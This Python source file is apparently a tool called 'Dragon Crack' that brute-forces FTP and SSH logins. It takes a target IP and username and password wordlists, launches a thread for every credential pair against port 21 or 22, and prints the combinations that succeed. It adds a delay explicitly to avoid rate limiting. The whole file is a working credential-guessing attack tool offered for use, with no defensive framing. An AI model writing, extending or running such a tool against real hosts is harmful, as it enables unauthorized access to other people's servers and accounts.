#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import paramiko
import ftplib
import time
import os

# Global delay between attempts to avoid rate limiting (in seconds)
DELAY = 0.5

# Colors
RED = '\033[1;31m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
MAGENTA = '\033[1;35m'
WHITE = '\033[1;37m'
CYAN = '\033[1;36m'
END = '\033[0m'

def menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
\033[0;31m#####################################################################################################\033[0m
\033[0;31m##                                                                                                 \033[0;31m##\033[0m 
\033[0;31m##  \033[1;31m██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗ \033[1;37m ██████╗██████╗  █████╗  ██████╗██╗  ██╗  \033[0;31m##\033[0m
\033[0;31m##  \033[1;31m██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║ \033[1;37m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝  \033[0;31m##\033[0m
\033[0;31m##  \033[1;31m██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║ \033[1;37m██║     ██████╔╝███████║██║     █████╔╝   \033[0;31m##\033[0m
\033[0;31m##  \033[1;37m██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║ \033[1;31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗   \033[0;31m##\033[0m
\033[0;31m##  \033[1;37m██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║ \033[1;31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  \033[0;31m##\033[0m
\033[0;31m##  \033[0;37m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ \033[1;31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  \033[0;31m##\033[0m
\033[0;31m#####################################################################################################\033[0m
\033[0;31m##                                  ## \033[1;31mGITHUB: \033[1;37mR3LI4NT & isPique \033[0;31m##                                \033[0;31m##\033[0m
\033[0;31m#####################################################################################################\033[0m
              \033[0;31m## \033[1;37mFTP \033[1;31mCRACKER\033[0m \033[0;31m##\033[0m                                       \033[0;31m##\033[1;37m SSH \033[1;31mCRACKER \033[0m\033[0;31m##\033[0m
              \033[0;31m#################\033[0m                                       \033[0;31m#################\033[0m""")

    print("""\n\033[1;37m[\033[0;31m1\033[1;37m]\033[0m FTP CRACK\n\033[1;37m[\033[0;31m2\033[1;37m]\033[0m SSH CRACK\n""")

def bruteFTP(ip, port, user, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=5)
        ftp.login(user, password)
        ftp.quit()
        print(f"{GREEN} FTP - Success: User: {user} | Pass: {password}{END}")
    except ftplib.error_perm:
        print(f"{RED}=> FTP Authentication Failed for {user}:{password}{END}")
    except Exception as e:
        print(f"{YELLOW}=> FTP Error: {e}{END}")
    finally:
        time.sleep(DELAY)

def bruteSSH(ip, port, user, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=user, password=password, timeout=5)
        print(f"{GREEN}SSH - Success: User: {user} | Pass: {password}{END}")
    except paramiko.AuthenticationException:
        print(f"{RED}=> SSH Authentication Failed for {user}:{password}{END}")
    except Exception as e:
        print(f"{YELLOW}=> SSH Error: {e}{END}")
    finally:
        client.close()
        time.sleep(DELAY)

def start_brute_force(ip, port, usernames, passwords, protocol):
    threads = []
    for u in usernames:
        for p in passwords:
            if protocol == 'ftp':
                t = threading.Thread(target=bruteFTP, args=(ip, port, u, p))
            elif protocol == 'ssh':
                t = threading.Thread(target=bruteSSH, args=(ip, port, u, p))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

def get_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"{RED}=> File not found: {file_path}{END}")
        return []

def main():
    menu()
    try:
        option = int(input(f"{RED}=>{END} "))
        if option not in [1, 2]:
            raise ValueError

        ip = input(f"\n{GREEN}IP{END} Address : ")
        if option == 1:
            port = 21
            protocol = 'ftp'
        else:
            port = 22
            protocol = 'ssh'

        username_file = input(f"{GREEN}User(s){END} wordlist : ")
        usernames = get_wordlist(username_file)
        if not usernames:
            return

        password_file = input(f"{GREEN}Passwords{END} wordlist : ")
        passwords = get_wordlist(password_file)
        if not passwords:
            return

        print(f"{GREEN}Port{END} : {port}\n")
        start_brute_force(ip, port, usernames, passwords, protocol)

    except ValueError:
        print(f"{RED}Invalid option. Please select 1 or 2.{END}")

if __name__ == "__main__":
    main()
